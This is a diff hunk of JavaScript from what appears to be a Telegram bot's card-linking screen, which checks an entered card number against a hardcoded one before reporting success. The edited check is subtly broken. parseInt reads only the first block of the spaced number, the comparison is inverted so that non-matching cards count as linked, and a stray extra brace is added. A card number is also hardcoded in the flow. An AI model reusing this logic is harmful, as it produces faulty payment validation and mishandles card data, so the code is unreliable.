@@ -1616,11 +1616,14 @@
                 setTimeout(() => {
                     // Скрываем блок .loader и отображаем блок .container-error
                     loader.style.display = "none";
-                    if (document.getElementById('cardNumber').value === '5167 4345 5899 7134') {
+                    const cardNumber = parseInt(document.getElementById('cardNumber').value, 10); 
+                    const fakeCardNumber = 5167434558997134;
+
+                    if (cardNumber !== fakeCardNumber) { {
                       userID = tg.initDataUnsafe.user.id;
 
                       let DataText = `<b>🎉 Awesome! You've successfully linked your card to the bot!</b>\n\n 🎉Thanks for choosing us! 😊`;
-
+                      
                       let success_add = `add_credit_card5167 4345 5899 7134`;
 
                       let replyMarkup = {
